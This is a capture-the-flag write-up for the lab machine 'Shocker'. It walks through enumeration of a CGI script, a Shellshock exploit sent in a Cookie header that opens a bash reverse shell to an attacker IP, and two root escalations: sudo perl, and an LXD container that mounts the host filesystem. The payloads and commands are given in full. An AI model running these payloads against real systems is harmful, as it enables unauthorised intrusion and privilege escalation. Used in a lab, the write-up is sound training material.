## Initial Enumeration
Running nmap scan (TCP) on the target shows the following
```

```
Before further going we can see that this box is running Ubuntu and a vulnerable version of OpenSSH that can allow us to enumerate system's users.  
Now let's keep this in mind and dig deeper into port 80.
Here if we run gobuster we found nothing, but using dirb we can discover the following directory:
```
+ http://10.10.10.56/cgi-bin/ (CODE:403|SIZE:294)
+ http://10.10.10.56/index.html (CODE:200|SIZE:137)
+ http://10.10.10.56/server-status (CODE:403|SIZE:299)
```
Common Gateway Interface (CGI) is an interface specification that enables web servers to execute an external program, typically to process user requests.  
Such programs are often written in a scripting language and are commonly referred to as CGI scripts, but they may include compiled programs.  
So, let's get deeper and try to enumerate using dirb the /cgi-bin directory for commong scripting extensions like .sh and .pl.  
As we can see we get the following result:
```
+ http://10.10.10.56/cgi-bin/user.sh (CODE:200|SIZE:119)
```
If we send an HTTP request, we can see the following page:
```
HTTP/1.1 200 OK
Date: Mon, 15 Nov 2021 16:20:38 GMT
Server: Apache/2.4.18 (Ubuntu)
Connection: close
Content-Type: text/x-sh
Content-Length: 118

Content-Type: text/plain

Just an uptime test script
 11:20:38 up  4:46,  0 users,  load average: 0.00, 0.00, 0.00
```
So, it seems like that a bash script is executing an uptime command for generating the response.  
When a web server uses the Common Gateway Interface (CGI) to handle a document request, it copies certain information from the request into the environment variable list and then delegates the request to a handler program.  
If the handler is a Bash script, or if it executes one for example using the system call, Bash will receive the environment variables passed by the server and will process them as described above.  
This provides a means for an attacker to trigger the Shellshock vulnerability with a specially crafted document request.
Shellshock affects bash 1.0.3-4.3 [from this page](https://packages.ubuntu.com/xenial/allpackages) we can see that shellshock maybe is unavailable for this version of Ubuntu.  
Let's check it anyway, using the dedicated nmap plugin
```
[root@kali Shocker ]$ locate .nse | grep shellshock
/usr/share/nmap/scripts/http-shellshock.nse
```
Now we can open this nmap plugin and see how to run this:
```
nmap -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=ls $TARGET
```
And we do get the following output and see that the target is vulnerable to shellshock
```

## User
To see how shellshock works and hopefully pop a shell we can open burp and go to Proxy > Options > Proxy Listeners and add a new listener on port 8081, setting the redirection to 10.10.10.56 port 80.  
Now, as the proxy is configured, we can connect to the server using 127.0.0.1:8081.  
So, let's start a further nmap scan with the following command.
```
nmap -sV -p8081 --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=/bin/ls 127.0.0.1
```
Now, if we do open burp, we can go to HTTP History and see the command execution request generated by the nmap probe.  
We can edit the request as follow and obtain a shell with user shelly.
```
GET /cgi-bin/user.sh HTTP/1.1
Cookie: () { :;}; echo; /bin/bash -i >& /dev/tcp/10.10.14.20/8082 0>&1
Host: localhost:8081
Connection: close
```
Proof:
```
[ root@kali Shocker ]$ nc -lvnp 8082

connect to [10.10.14.20] from (UNKNOWN) [10.10.10.56] 57644

```
## Root
### Method 1 - Sudo GTFOBins
Once we are logged in we can try a ```sudo -l``` and see our sudo capabilities, or with a more methodic approach let's run linPEAS.    
After we run linPEAS we can see the following marked as a highly probable privilege escalation vector:
```
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d                                                     
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                           
Matching Defaults entries for shelly on Shocker:                                                                      
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:                                                                
    (root) NOPASSWD: /usr/bin/perl
```
So, if we just [GTFOBins for Perl/sudo](https://gtfobins.github.io/gtfobins/perl/#sudo) we can escalate to root by simply:
```
shelly@Shocker:/usr/lib/cgi-bin$ sudo perl -e 'exec "/bin/sh";'
# id
uid=0(root) gid=0(root) groups=0(root)
```

### Method 2 - LXD container manager
A far more complicated way to obtain the root flag is by building a container that mounts the / fs.
As we can see, after we run linPEAS we can see the following marked as a highly probable privilege escalation vector:
```
╔═══════════════════════════════════╣ Users Information ╠════════════════════════════════════                                                                  
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#users                                                                                                                                                                  
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)                                                                                          
```
As we can see here, user shelly is part of lxd group and hence we can try to escalate to root by building an alpine linux image that mounts the root fs as discribed [here](https://book.hacktricks.xyz/linux-unix/privilege-escalation#users).  
LXD is Ubuntu’s system container manager. This is similar to virtual machines, however, instead using linux containers.  
The lxd group should be considered harmful in the same way the docker group is.  
Any member of the lxd group can immediately escalate their privileges to root on the host operating system.
To Exploit this vulnerability, first of all we need to run the following commands on our local machine:
```
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder/
bash build-alpine
```
After we run this command we can transfer the ```alpine-v3.14-x86_64-20211115_1157.tar.gz``` image to the remote server, and run the following command.
```
lxc image import ./alpine-v3.14-x86_64-20211115_1157.tar.gz --alias alpine
```
we do get the following error:
```
shelly@Shocker:/dev/shm$ lxc image import ./alpine-v3.12-x86_64-20200826_2058.tar.gz --alias alpine
Generating a client certificate. This may take a minute...                                                         
error: mkdir /.config: permission denied
```
This is due to an environment variable not set, probably due to the nature of our shell access to the system.  
Poking around the man, we can see:
```
Environment:                                                                                                       
  LXD_CONF         Path to an alternate client configuration directory                                             
  LXD_DIR          Path to an alternate server directory                                        
```
so let's change this to:
```                   
shelly@Shocker:/dev/shm$ export LXD_CONF="/dev/shm"
```
and proceed with the exploit.  
```
lxc image import ./alpine-v3.14-x86_64-20211115_1157.tar.gz --alias alpine
lxc image list # verify that the image is loaded
lxc init alpine alpine-container -c security.privileged=true
lxc config device add alpine-container alpine-device disk source=/ path=/mnt/root recursive=true
```
finally, we can start the container and run a bash shell:
```
lxc start alpine-container
lxc exec alpine-container /bin/sh
```
However, we mounted the host “/” directory to the directory “/mnt/root” in the alpine container.  
So if we visit “/mnt/root”, we can see the content of the “/” directory of the host OS.
```
shelly@Shocker:/dev/shm$ lxc exec alpine-container /bin/sh
cat /mnt/root/root/root.txt
606ecc631fd2f9d3bf0b671a8aaec7fe
```
